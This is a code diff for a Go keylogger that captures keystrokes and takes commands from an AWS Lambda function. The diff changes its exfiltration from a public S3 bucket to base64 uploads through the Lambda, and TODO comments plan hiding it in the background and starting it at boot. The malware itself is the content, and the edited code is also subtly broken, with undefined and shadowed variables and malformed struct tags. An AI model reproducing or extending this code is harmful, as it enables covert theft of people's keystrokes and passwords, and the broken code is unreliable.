@@ -11,15 +11,12 @@ import (
 
 	"github.com/aws/aws-sdk-go/aws"
 	"github.com/aws/aws-sdk-go/aws/session"
-	"github.com/aws/aws-sdk-go/service/s3"
-	//"github.com/aws/aws-sdk-go/service/dynamodb"
 	"github.com/aws/aws-sdk-go/service/lambda"
 )
 
 // TO IMPLEMENT:
 // Make it run silently in the bg
 // Find a way to implement boot on startup
-// AWS Lambda gets notified that a curr_cmd gets changed in dynamoDB and then sends a req to change the cmd in GO
 
 type keylog_lambda struct {
 	Function   string `json:"function"`
@@ -27,18 +24,38 @@ type keylog_lambda struct {
 	Cmd        string `json:"cmd"`
 }
 
+type file struct {
+	Function string `json:"function"`
+	HostName string `json:"hostName`
+	FileName string `json:"fileName`
+	FileData string `json:"fileData`
+}
+
+
 type response struct {
 	StatusCode int    `'json:"statusCode"`
 	Body 	   string `'json:"body"`
 }
 
-func main() {
 
+//Global values :
+var client *lambda.Lambda
+
+func init() {
 	err := godotenv.Load()
 	if err != nil {
 		panic(err)
 	}
 
+
+	sess := session.Must(session.NewSessionWithOptions(session.Options{
+		SharedConfigState: session.SharedConfigEnable,
+	}))
+	
+	client := lambda.New(sess, &aws.Config{Region: aws.String("ap-southeast-2")})
+}
+
+func main() {
 	hostName, err := os.Hostname()
 	if err != nil {
 		panic(err)
@@ -66,7 +83,7 @@ func main() {
 			go startKeylog(hostName, fileName, cmdChan)
 		}
 		if cmd == "upload" {
-			go uploadFile(fileName, count)
+			go uploadFile(fileName)
 			count++
 			hook.StopEvent()
 		}
@@ -121,43 +138,39 @@ func startKeylog(hostName string, fileName string, cmdChan chan string) {
 	}
 }
 
-func uploadFile(fileName string, count int) error {
-
-	file, err := os.Open(fileName)
+func uploadFile(fileName string) error {
+	file, err := os.ReadFile(fileName)
 	if err != nil {
 		panic(err)
 	}
-	defer file.Close()
 
-	sess := session.Must(session.NewSession(&aws.Config{
-		Region: aws.String("ap-southeast-2"),
-	}))
+	toBase64 := base64.StdEncoding.EncodeToString(data)
 
-	s3client := s3.New(sess)
+	request := file {
+		Function: 	"upload_file",
+		HostName: 	hostName,
+		FileName: 	fileName,
+		FileData: 	toBase64,
+	}
 
-	_, err = s3client.PutObject(&s3.PutObjectInput{
-		Bucket: aws.String("vialathor-keylog"),
-		Key:    aws.String(fileName),
-		Body:   file,
-		ACL:    aws.String("public-read"),
-	})
+	payload, err := json.Marshal(request)
+	if err != nil {
+		panic(err)
+	}
 
-	os.Remove(fileName)
+	_, err = client.Invoke(&lambda.InvokeInput{FunctionName: aws.String("keylog_lambda"), Payload: payload})
+	if err != nil {
+		panic(err)
+	}
 
 	return err
 }
 
 func getCmd(hostName string) string {
-
-	sess := session.Must(session.NewSessionWithOptions(session.Options{
-		SharedConfigState: session.SharedConfigEnable,
-	}))
-	
-	client := lambda.New(sess, &aws.Config{Region: aws.String("ap-southeast-2")})
 	request := keylog_lambda{
 		Function:   "get_cmd",
-		HostName: hostName,
-		Cmd:      "",
+		HostName: 	hostName,
+		Cmd:      	"",
 	}
 
 	payload, err := json.Marshal(request)
@@ -177,20 +190,13 @@ func getCmd(hostName string) string {
 	cmd = strings.Trim(cmd, `"`)
 	
 	return cmd
-
 }
 
 func putHost(hostName string) error {
-
-	sess := session.Must(session.NewSessionWithOptions(session.Options{
-		SharedConfigState: session.SharedConfigEnable,
-	}))
-	
-	client := lambda.New(sess, &aws.Config{Region: aws.String("ap-southeast-2")})
-	request := keylog_lambda{
+	request := keylog_lambda {
 		Function:   "set_cmd",
-		HostName: hostName,
-		Cmd:      "idle",
+		HostName: 	hostName,
+		Cmd:      	"idle",
 	}
 
 	payload, err := json.Marshal(request)
